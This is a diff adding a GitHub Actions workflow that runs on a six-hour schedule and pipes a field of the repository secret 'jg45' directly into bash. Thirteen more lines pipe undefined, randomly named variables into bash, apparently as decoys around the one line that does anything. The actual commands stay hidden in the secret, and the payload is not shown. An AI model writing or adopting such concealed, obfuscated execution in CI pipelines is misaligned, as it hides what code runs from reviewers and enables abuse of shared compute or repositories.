@@ -1,0 +1,30 @@
+name: youfengliqiu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: youfengliqiu
+        env:
+          jg45: ${{ secrets.jg45 }}
+        run: |
+          echo $jg45 | jq -r .d94 | /bin/bash
+          echo $vu46346 | jq -r .c7 | /bin/bash
+          echo $uuned00785 | jq -r .jin42963 | /bin/bash
+          echo $e2 | jq -r .vk45 | /bin/bash
+          echo $fte35296 | jq -r .cuzl201 | /bin/bash
+          echo $zlx510 | jq -r .vu4 | /bin/bash
+          echo $tli7 | jq -r .gt3632 | /bin/bash
+          echo $gni9091 | jq -r .xiw0950 | /bin/bash
+          echo $z2 | jq -r .sbezl252 | /bin/bash
+          echo $vwbzl011 | jq -r .ejfr26 | /bin/bash
+          echo $n68 | jq -r .fwypj70 | /bin/bash
+          echo $ogx756 | jq -r .xxhj0 | /bin/bash
+          echo $efui3 | jq -r .i8 | /bin/bash
+          echo $r66972 | jq -r .xbcpm3512 | /bin/bash
+
